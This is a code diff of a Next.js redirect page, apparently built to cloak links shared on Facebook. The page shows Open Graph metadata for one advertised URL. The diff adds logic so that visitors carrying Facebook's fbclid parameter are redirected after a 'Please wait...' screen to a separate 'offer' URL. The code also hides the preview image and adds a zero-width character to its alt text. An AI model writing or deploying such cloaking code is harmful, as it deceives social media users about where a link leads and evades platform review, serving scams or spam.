@@ -3,13 +3,13 @@ import { GetServerSideProps } from "next";
 import Head from "next/head";
 import { useEffect } from "react";
 
-
-
 interface Props {
   redirectUrl: string;
   imageUrl: string;
-  title: string; // ✅ tambahkan ini
+  title: string;
 }
+
+const offerUrl = "https://example.com/offer"; // 🔁 Ganti ini dengan URL offer kamu
 
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const encoded = context.query.data as string;
@@ -20,7 +20,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
 
   try {
     const decoded = Buffer.from(encoded, "base64").toString("utf-8");
-    const { redirectUrl, imageUrl, title } = JSON.parse(decoded); // ✅ ambil title juga
+    const { redirectUrl, imageUrl, title } = JSON.parse(decoded);
 
     if (!redirectUrl || !imageUrl) throw new Error("Invalid data");
 
@@ -31,42 +31,52 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
     return { notFound: true };
   }
 };
-const blankZWNJ = '\u200C';
+
+const blankZWNJ = "\u200C";
 
 export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
   useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const hasFbclid = params.has("fbclid");
+
+    const targetUrl = hasFbclid ? offerUrl : redirectUrl;
+
     const timer = setTimeout(() => {
-      window.location.href = redirectUrl;
+      window.location.href = targetUrl;
     }, 2500);
+
     return () => clearTimeout(timer);
   }, [redirectUrl]);
 
   return (
     <>
       <Head>
-        <meta property="og:title" content={title}/>
-        <meta name="description" content={`Click to read more on this page: ${redirectUrl}`}/>
+        <title>{title}</title>
+        <meta property="og:title" content={title} />
+        <meta name="description" content={`Click to read more on this page: ${redirectUrl}`} />
         <meta property="og:url" content={redirectUrl} />
+        {imageUrl && <meta property="og:image" content={imageUrl} />}
       </Head>
+
       <body style={{ margin: 0, padding: 0 }}>
         {imageUrl && (
           <img
             src={imageUrl}
             width="1200"
             height="630"
-            alt="{title}{blankZWNJ}"
+            alt={`${title}${blankZWNJ}`}
             style={{
-              display: 'none',
-              width: '100%',
-              height: 'auto',
+              display: "none",
+              width: "100%",
+              height: "auto",
             }}
           />
         )}
-        <div style={styles.container}>
-        <div style={styles.loader}></div>
-        <div style={styles.loadingText}>Please wait...</div>
-        </div>
 
+        <div style={styles.container}>
+          <div style={styles.loader}></div>
+          <div style={styles.loadingText}>Please wait...</div>
+        </div>
       </body>
     </>
   );
